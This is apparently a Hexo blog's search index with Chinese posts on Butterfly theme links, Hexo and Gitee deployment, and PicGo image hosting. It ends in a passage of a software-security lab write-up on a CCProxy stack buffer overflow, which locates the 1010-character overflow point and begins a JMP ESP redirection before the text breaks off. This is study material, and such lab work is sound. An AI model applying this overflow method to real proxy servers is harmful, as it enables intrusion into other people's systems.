<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Butterfly美化记录帖</title>
    <url>/2021/10/30/Butterfly%E7%BE%8E%E5%8C%96%E8%AE%B0%E5%BD%95%E5%B8%96/</url>
    <content><![CDATA[<hr />
<div class='poem'><div class='poem-title'>水调歌头</div><div class='poem-author'>苏轼</div><p>​       丙辰中秋，欢饮达旦，大醉，作此篇，兼怀子由。<br />
​       明月几时有？把酒问青天。<br />
​       不知天上宫阙，今夕是何年？<br />
​       我欲乘风归去，又恐琼楼玉宇，高处不胜寒。<br />
​       起舞弄清影，何似在人间？</p>
<p>转朱阁，低绮户，照无眠。<br />
不应有恨，何事长向别时圆？<br />
人有悲欢离合，月有阴晴圆缺，此事古难全。<br />
但愿人长久，千里共婵娟。</p>
</div>
<hr />
<br>
<p><a href="https://www.antmoe.com/posts/a811d614/">Hexo 博客之 butterfly 主题优雅魔改系列 | 小康博客 (antmoe.com)</a></p>
<br>
<p><a href="https://butterfly.lete114.top/article/Butterfly-config.html">Butterfly主题美化-无修改源码 | Lete乐特 's Blog (lete114.top)</a></p>
<br>
<p><a href="https://zfe.space/post/hexo-butterfly-orchid.html">小冰插件包 butterfly-orchid 1.0 | 小冰博客 (zfe.space)</a></p>
<br>
<p><a href="https://akilar.top/posts/615e2dec/">Tag Plugins Plus | Akilarの糖果屋</a></p>
<br>
<p><a href="https://blog.imzjw.cn/posts/b74f504f/">关于我 Butterfly 主题的所有美化 | 小嘉的部落格 (imzjw.cn)</a></p>
<br>
<p><a href="https://butterfly.js.org/">Butterfly - A Simple and Card UI Design theme for Hexo</a></p>
<br>
<p><a href="https://xiabor.com/4215.html#%E4%BE%A7%E6%A0%8F%E7%9B%AE%E5%BD%95%E6%B6%88%E5%A4%B1">Butterfly 主题更新总结 | MuJin’s Blog (xiabor.com)</a></p>
<br>
<p><a href="http://www.c-hasel.cn/2019/12/01/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%BA%8C/">hexo博客搭建二:Butterfly主题应用及配置 | Corey’s Blog (c-hasel.cn)</a></p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo 建站笔记</title>
    <url>/2021/04/08/Hexo-%E5%BB%BA%E7%AB%99%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="搭建hexo框架"><a class="markdownIt-Anchor" href="#搭建hexo框架"></a> 搭建Hexo框架</h1>
<p>本文基于windows操作系统搭建，hexo的相关操作可以用cmd命令台进行，也可以用下面安装的Git进行（推荐）；关于hexo主题的相关美化见后续文章，该系列可能会保持更新。另：本人也作为刚接触这里的新手，在文章中主要总结个人建站过程中的参考所得，望有不对的地方不吝赐教！</p>
<h2 id="设置淘宝镜像"><a class="markdownIt-Anchor" href="#设置淘宝镜像"></a> 设置淘宝镜像</h2>
<p>由于在windows上使用npm下载时可能会速度过慢，所以这里改为淘宝镜像网站：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry <span class="string">&quot;https://registry.npm.taobao.org&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="安装git"><a class="markdownIt-Anchor" href="#安装git"></a> 安装Git</h2>
<p>Git官网地址：<a href="https://gitforwindows.org/">https://gitforwindows.org/</a></p>
<p>安装过程无脑“下一步”即可。</p>
<h2 id="安装nodejs"><a class="markdownIt-Anchor" href="#安装nodejs"></a> 安装Node.js</h2>
<p>Node.js官网：<a href="https://nodejs.org/en/">https://nodejs.org/en/</a></p>
<p>这里推荐安装LTS(长期支持)版，选择对应的系统版本即可。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210408-01.png" alt="image-20210408184444633" /></p>
<h2 id="安装hexo"><a class="markdownIt-Anchor" href="#安装hexo"></a> 安装Hexo</h2>
<p>可以自行创建目录，名称随意，例如D:\Hexo\myblog，并在myblog文件夹右键使用Git bash here(或者cmd进入该文件夹)，命令行输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装Hexo</span></span><br><span class="line">npm install -g hexo-cli</span><br><span class="line"><span class="comment">#初始化博客</span></span><br><span class="line">hexo init</span><br><span class="line"><span class="comment">#Hexo三连,分别为清空生成文件、生成网站文件、启动本地预览</span></span><br><span class="line">hexo cl &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure>
<p>此时若没有错误情况，由于hexo默认位于4000端口开启，则可以在浏览器中打开***localhost:4000***，就可以看到已经初始化的Hexo博客，默认产生第一篇文章Hello world!此外也可以更换端口使用命令  <strong>hexo s -p 端口号</strong>  即可。</p>
<h2 id="博客部署"><a class="markdownIt-Anchor" href="#博客部署"></a> 博客部署</h2>
<p>由于我个人搭建的时候服务器仍未达到备案的期限，所以这里介绍将个人博客部署到github上面，后续若部署到个人域名时再进行更新。<br />
首先，登录github创建一个新的仓库，并将仓库名命名为  <em><strong><a href="http://xn--eqr924avxo.github.io">用户名.github.io</a></strong></em>，注意这里仓库的名字是固定格式！！！<br />
打开博客根目录（Hexo/myblog)下的根配置文件  <em><strong>_config.yml</strong></em>  文件找到deploy项，修改如下代码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">   <span class="built_in">type</span>: <span class="string">&#x27;git&#x27;</span></span><br><span class="line">   repo: https://github.com/用户名/仓库名</span><br><span class="line">   <span class="comment"># 如Https://github.com/zhangsan/zhangsan.github.io</span></span><br><span class="line">   branch: master</span><br></pre></td></tr></table></figure>
<p>注： 注意在本博客几乎所有配置文件中，冒号之后都留有空格</p>
<p>在进行上传之前，需要先在Git bash中进行对<strong><a href="http://user.name">user.name</a></strong>和<strong>user.email</strong>的设置，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;Github用户名&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;GitHub绑定邮箱&quot;</span></span><br><span class="line"><span class="comment">#最后再进行上传</span></span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
<p>他喵的现在Github时不时登录不上去，所以在进行hexo d部署的时候也经常会出现超时的错误，还是建议部署到自己的域名上去，后续部署时会对该文章进行更新的。</p>
<h1 id="基础配置"><a class="markdownIt-Anchor" href="#基础配置"></a> 基础配置</h1>
<h2 id="主题设置"><a class="markdownIt-Anchor" href="#主题设置"></a> 主题设置</h2>
<p>hexo提供了大量可选的主题，参考网站：<a href="https://hexo.io/themes/">Hexo主题</a></p>
<p>在根目录配置文件中可以设置主题，这里以butterfly主题为例，修改***theme***字条即可：<br />
<img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210408204749.png" alt="alt 主题设置" /></p>
<p>在上述网站或其他途径选择主题后需要将主题文件保存到**/themes**目录下，例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装渲染插件</span></span><br><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure>
<h2 id="基础页"><a class="markdownIt-Anchor" href="#基础页"></a> 基础页</h2>
<p>hexo创建页面的命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page 页面名称</span><br></pre></td></tr></table></figure>
<p>创建成功后会在命令行中提示新建页面的位置，对文件<strong><a href="http://index.md">index.md</a></strong>进行编辑可以修改页面布局。对不同主题，可以查看相应主题的文档使用，这里以butterfly主题对页面属性为例，如下表：</p>
<table>
<thead>
<tr>
<th style="text-align:center">属性</th>
<th style="text-align:center">解释</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">title</td>
<td style="text-align:center">【必需】页面标题</td>
</tr>
<tr>
<td style="text-align:center">date</td>
<td style="text-align:center">【必需】创建日期</td>
</tr>
<tr>
<td style="text-align:center">updated</td>
<td style="text-align:center">【可选】更新日期</td>
</tr>
<tr>
<td style="text-align:center">type</td>
<td style="text-align:center">【必需】页面类型</td>
</tr>
<tr>
<td style="text-align:center">description</td>
<td style="text-align:center">【可选】页面描述</td>
</tr>
<tr>
<td style="text-align:center">top_img</td>
<td style="text-align:center">【可选】顶部图片</td>
</tr>
<tr>
<td style="text-align:center">aside</td>
<td style="text-align:center">【可选】显示侧边栏</td>
</tr>
<tr>
<td style="text-align:center">aplayer</td>
<td style="text-align:center">【可选】加载Aplayer</td>
</tr>
<tr>
<td style="text-align:center">keyworads</td>
<td style="text-align:center">【可选】页面关键字</td>
</tr>
</tbody>
</table>
<h2 id="文章页"><a class="markdownIt-Anchor" href="#文章页"></a> 文章页</h2>
<p>创建命令为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new <span class="string">&quot;文章命令&quot;</span></span><br></pre></td></tr></table></figure>
<p>同上述基础页介绍，具体属性等可参照下面的参考资料。</p>
<h2 id="页面设置"><a class="markdownIt-Anchor" href="#页面设置"></a> 页面设置</h2>
<p>打开根目录下的***_config.yml***文件可以看到下面的属性：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#site</span></span><br><span class="line">title: (1)</span><br><span class="line">description: (2)</span><br><span class="line">author: (3)</span><br><span class="line">language: 默认en,可修改</span><br><span class="line">email: <span class="string">&#x27;邮箱地址&#x27;</span></span><br></pre></td></tr></table></figure>
<p>相应位置如下图：</p>
<div align="center">
    	<img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/%E4%B8%8B%E8%BD%BD.png">  
    	<img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210408212212.png">
</div>
后续会写对butterfly的美化过程。
<h1 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h1>
<p>【1】<a href="https://hexo.io/docs/">Hexo文档</a><br />
【2】<a href="https://butterfly.js.org/posts/21cfbf15/">Jerry大佬教程</a></p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo部署到Gitee及相关问题</title>
    <url>/2021/04/19/Hexo%E9%83%A8%E7%BD%B2%E5%88%B0Gitee%E5%8F%8A%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<hr />
<h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2>
<p>之前一直都是写好文章后直接部署到Github上，但最近发现Github会经常性连接不上，这对于我这个希望即写即传的人来说实在是太难受了。后来想到之前将图床部署在Gitee上，那么能不能将博客也部署在Gitee上呢？话不多说直接上手搜一手，果不其然是可以的，由于Gitee是国内的，不存在说连不上的问题，所以直接决定动手部署了！</p>
<hr />
<h2 id="创建仓库"><a class="markdownIt-Anchor" href="#创建仓库"></a> 创建仓库</h2>
<ul>
<li>类似于在Github上部署的操作，在Gitee上先创建一个用户名同名的仓库，创建仓库时，语言选择<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>h</mi><mi>t</mi><mi>m</mi><mi>l</mi></mrow><annotation encoding="application/x-tex">html</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span><span class="mord mathdefault">t</span><span class="mord mathdefault">m</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span></span></span></span>，可以先不进行初始化，选择公开。</li>
</ul>
<h2 id="添加ssh公钥"><a class="markdownIt-Anchor" href="#添加ssh公钥"></a> 添加SSH公钥</h2>
<ul>
<li>
<p>首先在博客根目录打开<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>G</mi><mi>i</mi><mi>t</mi><mtext> </mtext><mi>B</mi><mi>a</mi><mi>s</mi><mi>h</mi><mtext> </mtext><mi>H</mi><mi>e</mi><mi>r</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">Git\ Bash\ Here</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">G</span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mspace"> </span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">h</span><span class="mspace"> </span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span></span></span></span>,创建<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mi>S</mi><mi>H</mi></mrow><annotation encoding="application/x-tex">SSH</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span></span></span></span>公钥命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;用户名&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;邮箱地址&quot;</span></span><br><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;邮箱地址(同上一条命令)&quot;</span></span><br></pre></td></tr></table></figure>
<p><em><strong>注意：上面第三条命令中的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>s</mi><mi>h</mi><mo>−</mo><mi>k</mi><mi>e</mi><mi>y</mi><mi>g</mi><mi>e</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">ssh-keygen</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord mathdefault">h</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span></span></span></span>是连在一起的，没有空格！没有空格！没有空格！重要的事情说三遍，猛男落泪😢😢😢</strong></em></p>
<p>上面命令进行时会提示公钥存储路径，一般情况下为  C:\Users\用户名.ssh ，查看目录可以发现 id_rsa和 id_rsa.pub​两个文件，其中id_rsa.pub正是我们需要的公钥。一路<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mi>n</mi><mi>t</mi><mi>e</mi><mi>r</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">Enter\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>下去即可。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210419161954.png" alt="alt SSH公钥" /></p>
<p>最后成功的结果如下图：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210419162156.png" alt="alt 密钥成功生成" /></p>
</li>
<li>
<p>接下来在Gitee中添加该公钥即可，具体方法为“设置<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>→</mo><mi>S</mi><mi>S</mi><mi>H</mi></mrow><annotation encoding="application/x-tex">\rightarrow SSH</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span></span></span></span>公钥”，添加公钥时公钥标题为仓库的名称，将上述生成的id_rsa.pub中的全部内容粘贴到其中即可。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210419162626.png" alt="alt 添加密钥" /></p>
</li>
<li>
<p>测试密钥连接：在控制台输入以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -T git@gitee.com</span><br></pre></td></tr></table></figure>
<p>成功结果如下：</p>
</li>
</ul>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210419165541.png" alt="alt 密钥连接成功" /></p>
<h2 id="修改配置文件"><a class="markdownIt-Anchor" href="#修改配置文件"></a> 修改配置文件</h2>
<ul>
<li>
<p>接下来修改根目录下的   _config.yml 文件即可，具体修改内容中的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>e</mi><mi>p</mi><mi>o</mi></mrow><annotation encoding="application/x-tex">repo</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">p</span><span class="mord mathdefault">o</span></span></span></span>在仓库首页粘贴即可：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210419163409.png" alt="alt repo地址" /></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210419163504.png" alt="alt 配置文件修改" /></p>
</li>
<li>
<p>之后按照以前部署的命令一样，直接在清空缓存文件，重新生成后<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>h</mi><mi>e</mi><mi>x</mi><mi>o</mi><mtext>  </mtext><mi>d</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">hexo\;d\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">o</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>就行了。</p>
</li>
</ul>
<h2 id="开启gitee-pages服务"><a class="markdownIt-Anchor" href="#开启gitee-pages服务"></a> 开启Gitee Pages服务</h2>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210419163911.png" alt="alt Gitee Pages" /></p>
<ul>
<li>选择强制使用Https后启动，启动成功后会得到一个地址：<br />
<img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210419164119.png" alt="alt 网站地址" /></li>
<li>之后在_config.yml中将URL地址修改为该地址即可，需要注意的是每次更新(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>h</mi><mi>e</mi><mi>x</mi><mi>o</mi><mtext>  </mtext><mi>d</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">hexo\;d\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">o</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>)后，需要进入<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>G</mi><mi>i</mi><mi>t</mi><mi>e</mi><mi>e</mi><mtext>  </mtext><mi>P</mi><mi>a</mi><mi>g</mi><mi>e</mi><mi>s</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">Gitee\;Pages\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">G</span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>服务进行更新即可。</li>
</ul>
<h2 id="结言"><a class="markdownIt-Anchor" href="#结言"></a> 结言</h2>
<ul>
<li>到这里基本上已经部署好了，不过我在部署的时候遇到了一个问题，就是在本地预览正确的文章，部署到上面后再访问却缺失了部分内容，查看仓库中的Html文件代码正确，但是查看页面源代码却消失了！被谁吃了给我吐出来！。后来上网搜索之后找到了一个办法：清除浏览器缓存。一开始不信的我试了一下竟然成功了，好吧，我只能拍手成妙。</li>
</ul>
<h2 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h2>
<ul>
<li>
<p><a href="https://blog.csdn.net/qq_38157825/article/details/112783631">Hexo 部署到 Gitee</a></p>
</li>
<li>
<p><a href="https://blog.csdn.net/weixin_43889439/article/details/92760952">解决git@gitee.com: Permission denied (publickey).</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Gitee</tag>
      </tags>
  </entry>
  <entry>
    <title>PicGo + Gitee 搭建免费图床</title>
    <url>/2021/04/09/PicGo-Gitee-%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E5%9B%BE%E5%BA%8A/</url>
    <content><![CDATA[<h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2>
<p>搭建好自己的博客之后，非常激动啊！！！迫不及待的想写一篇文章来试试水，在往博客中插入图片时遇到了一个很大的问题：图片路径哪里来？由于搭建的是静态博客，如果将图片存放在本地硬盘空间内，网络端访问必然会产生无法获取图片的问题！玛莎卡？将图片存放在主题的 /source/img 文件夹下再在使用时使用相对路径？</p>
<p>细思极恐啊！当图片数量众多，项目文件必然臃肿，部署到云端也就更加慢了。在网上查找解决方法时发现可以搭建 <em><strong>图床</strong></em>  ，顾名思义就是云端用于存储图片的服务器吧，<a href="http://xn--SM-pv2cohk92bfhaq68bfrqkgnrupuf4a.MS">网上现在主流图床有SM.MS</a>、腾讯云COS、Github图床、七牛、阿里云等，当然免费的图床主推Github和Gitee了，但是Github在国外时不时无法连接，而且速度肯定没有国内的码云快了，当然使用阿里云和腾讯云那些就不比了（白嫖真香！）。所以这里就采用了 <u><em><strong>Gitee + PicGo</strong></em></u> 搭建自己的图床。</p>
<p>注：使用码云搭建的图床具有对图片大小的限制，超过1MB大小的图片需要登录才能进行显示，因此这里提供一个用于压缩图片的网站：</p>
<p><em><strong><a href="https://tinypng.com/">TingPNG:<u>压缩图片</u></a></strong></em></p>
<h2 id="合成材料"><a class="markdownIt-Anchor" href="#合成材料"></a> 合成材料</h2>
<table>
<thead>
<tr>
<th style="text-align:left">码云（Gitee）账号，没有的可以创建</th>
<th><a href="https://gitee.com/">https://gitee.com/</a></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">PicGo软件</td>
<td><a href="https://github.com/Molunerfinn/PicGo/releases/tag/v2.3.0-beta.5">https://github.com/Molunerfinn/PicGo/releases/tag/v2.3.0-beta.5</a></td>
</tr>
</tbody>
</table>
<p>注：<a href="https://github.com/Molunerfinn/PicGo">PicGo开源项目地址，可以查看使用文档</a></p>
<h2 id="gitee准备"><a class="markdownIt-Anchor" href="#gitee准备"></a> Gitee准备</h2>
<p>类似于Github，先创建一个仓库，这里姑且命名为images，在该仓库中创建一个文件夹用于存放图片（也可以不创建），这里使用img作为文件夹名称。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210409203754.png" alt="alt 示例" /></p>
<p>创建仓库时需要添加开源许可证啥的，跟着走就行，记得“是否开源”选择“公开”。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210409204152.png" alt="alt acejha" /></p>
<p>这些结束后，需要创建一个token，下面会用到这个私人令牌，具体方法为：“个人主页→个人设置→私人令牌→生成新令牌”，添加描述后默认勾选提交即可，复制到剪贴板备用。在私人令牌管理界面可以对令牌进行删除、修改和重新生成等操作。</p>
<h2 id="picgo配置"><a class="markdownIt-Anchor" href="#picgo配置"></a> PicGo配置</h2>
<p>安装好对应系统的PicGO后，在插件设置中找到Gitee-uploader插件安装，注意安装后重启软件。在正确安装的情况下，重启应用打开图床设置可以找到gitee选项。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210409205044.png" alt="alt jhhg" /></p>
<p>gitee设置界面，相关参数如下表：</p>
<table>
<thead>
<tr>
<th style="text-align:center">repo</th>
<th style="text-align:center">【必需】仓库名，见上文图片注释</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">master</td>
<td style="text-align:center">【可选】默认master</td>
</tr>
<tr>
<td style="text-align:center">token</td>
<td style="text-align:center">【必需】上文中生成的令牌</td>
</tr>
<tr>
<td style="text-align:center">path</td>
<td style="text-align:center">【可选】如果上文创建的话，可填img；反之可不填</td>
</tr>
<tr>
<td style="text-align:center">customPath和customUrl</td>
<td style="text-align:center">无需配置</td>
</tr>
</tbody>
</table>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210409205324.png" alt="alt shiji" /></p>
<p>点击确定和设为默认图床即可。</p>
<h2 id="说明"><a class="markdownIt-Anchor" href="#说明"></a> 说明</h2>
<p>在上传区，可以选择拖拽上传，也可以点击剪贴板上传直接将截图上传，上传成功的话会有系统消息提醒。同时，在下方可以选择返回值的格式，返回值会在剪贴板中保留，在编写文档时直接粘贴即可。相册中可以查看已经上传的图片，香的一批啊有木有！</p>
<p>最后附上一个我个人经常选择图片的网站：<a href="https://beta.bz.zzzmh.cn/index">极简壁纸</a></p>
<p>参考：<a href="https://github.com/Molunerfinn/PicGo">https://github.com/Molunerfinn/PicGo</a></p>
]]></content>
      <categories>
        <category>Gitee</category>
      </categories>
      <tags>
        <tag>教程</tag>
        <tag>Gitee</tag>
        <tag>图床</tag>
      </tags>
  </entry>
  <entry>
    <title>Win32漏洞实例分析---CCproxy</title>
    <url>/2021/06/27/Win32%E6%BC%8F%E6%B4%9E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90-CCproxy/</url>
    <content><![CDATA[<hr />
<div class="note orange icon simple"><i class="note-icon fas fa-battery-half"></i><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mi>s</mi><mo>:</mo></mrow><annotation encoding="application/x-tex">ps:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span></span></span>正好这两天在备考软件安全要复习实验内容，索性就打算复习实验的同时将部分内容的报告展示出来，做一次记录。实验中的内容可能在实际操作时会有差错，BUG可能会有的。</p>
</div>
<h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
<p><strong>操作系统：Microsoft windows XP SP3 或者 win7</strong></p>
<p><strong>溢出软件：CCPROXY</strong></p>
<p><strong>溢出工具：OllyDbg，Visual C++ 6.0</strong></p>
<hr />
<h1 id="实验过程记录"><a class="markdownIt-Anchor" href="#实验过程记录"></a> 实验过程记录</h1>
<h2 id="找到溢出点"><a class="markdownIt-Anchor" href="#找到溢出点"></a> 找到溢出点</h2>
<p>首先找出溢出点，在XP主机上打开CCProxy后再cmd控制台上利用“telnet 127.0.0.1”命令连接CCProxy代理服务，实验发现当ping一个较短的字符串时，程序会正常执行并提示“Host not found”，而当程序ping一个较长的字符串时会发生溢出并报错（如下图），利用简单的二分法多次尝试可以发现当ping后最多接1009个字符时恰好不产生溢出，而当其后有1010个字符时会发生溢出，且会溢出覆盖到EIP。</p>
<img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626215240.png" alt="溢出点查询" style="zoom:67%;" />
<p>得知上述溢出点后，接下来便可以进行漏洞利用，这里采用的工具为x32dbg，根据之前的“Host not found”提示，我们可以在dbg中进行字符串的搜索并定位到该字符串所在语句（如下图所示），在该语句处设置断点。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626215326.png" alt="查找“Host not Found”语句" /></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626215440.png" alt="设置断点" /></p>
<h2 id="设置jmp-esp跳转"><a class="markdownIt-Anchor" href="#设置jmp-esp跳转"></a> 设置<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>J</mi><mi>M</mi><mi>P</mi><mtext> </mtext><mi>E</mi><mi>S</mi><mi>P</mi></mrow><annotation encoding="application/x-tex">JMP\ ESP</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.09618em;">J</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace"> </span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" 